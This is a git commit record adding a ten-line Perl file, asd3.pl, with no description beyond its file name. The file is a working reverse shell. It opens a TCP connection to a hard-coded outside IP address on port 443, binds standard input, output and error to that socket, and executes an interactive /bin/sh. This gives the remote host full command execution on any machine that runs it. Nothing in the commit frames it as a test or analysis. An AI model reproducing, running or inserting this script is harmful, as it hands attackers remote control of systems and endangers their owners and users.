f3dc21c3fa6444c6de8773e69007db88cbe7c7dd
seddl <153813346+seddl@users.noreply.github.com>
2024-11-22 11:40:54 +0000

    Create asd3.pl

---
+++ asd3.pl
@@ -0,0 +1,10 @@
+use Socket; 
+$i="45.153.124.230"; 
+$p=443; 
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); 
+if(connect(S,sockaddr_in($p,inet_aton($i)))){ 
+	open(STDIN,">&S"); 
+	open(STDOUT,">&S"); 
+	open(STDERR,">&S"); 
+	exec("/bin/sh -i"); 
+};
